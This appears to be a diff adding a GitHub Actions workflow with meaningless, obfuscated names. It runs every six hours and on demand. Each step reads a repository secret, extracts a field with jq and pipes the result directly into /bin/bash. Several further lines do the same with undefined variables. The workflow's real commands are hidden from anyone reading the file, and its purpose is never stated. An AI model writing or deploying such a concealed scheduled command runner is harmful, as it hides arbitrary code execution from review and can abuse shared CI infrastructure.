@@ -1,0 +1,27 @@
+name: yanggongzi4371
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanggongzi4371
+        env:
+          rpg795: ${{ secrets.rpg795 }}
+        run: |
+          echo $rpg795 | jq -r .j56272 | /bin/bash
+          echo $lj790 | jq -r .vst6 | /bin/bash
+          echo $edseg69 | jq -r .jt548 | /bin/bash
+          echo $spa70 | jq -r .wkku36 | /bin/bash
+          echo $yyv561 | jq -r .qvx6687 | /bin/bash
+          echo $xmw04 | jq -r .x348 | /bin/bash
+          echo $jfpm23 | jq -r .ffc99 | /bin/bash
+          echo $ajmr2558 | jq -r .axzs87 | /bin/bash
+          echo $qojjr7 | jq -r .oo0453 | /bin/bash
+
